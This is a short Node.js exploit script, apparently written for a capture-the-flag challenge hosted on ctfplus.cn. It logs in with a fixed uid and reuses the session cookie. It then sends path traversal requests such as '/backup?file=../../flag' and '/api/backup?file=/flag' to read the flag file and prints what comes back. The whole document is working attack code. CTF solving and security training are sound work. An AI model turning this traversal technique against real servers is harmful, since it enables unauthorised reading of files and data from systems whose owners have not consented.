
const http = require('http');
const querystring = require('querystring');

// Login first
const postData = querystring.stringify({
  "uid": "9e5861b088a34b9380c789c735366c77"
});

const options = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/login',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(postData)
  }
};

const req = http.request(options, (res) => {
  let setCookie = res.headers['set-cookie'];
  let cookie = setCookie ? setCookie.map(c => c.split(';')[0]).join('; ') : '';
  console.log("Logged in, trying path traversal...");
  
  // Try GET /backup?file=../../flag
  getPage('/backup?file=../../flag', cookie, (body) => {
    console.log("Response for /backup?file=../../flag:");
    console.log(body);
    if (!body.includes('404') && !body.includes('Access Denied')) {
      console.log("\nGot it!");
    } else {
      // Try /api/backup?file=/flag
      getPage('/api/backup?file=/flag', cookie, (body2) => {
        console.log("\nResponse for /api/backup?file=/flag:");
        console.log(body2);
      });
    }
  });
});

req.on('error', err => console.error(err));
req.write(postData);
req.end();

function getPage(path, cookie, callback) {
  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: path,
    method: 'GET',
    headers: {
      'Cookie': cookie
    }
  };

  const req = http.request(options, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => callback(body));
  });
  req.end();
}
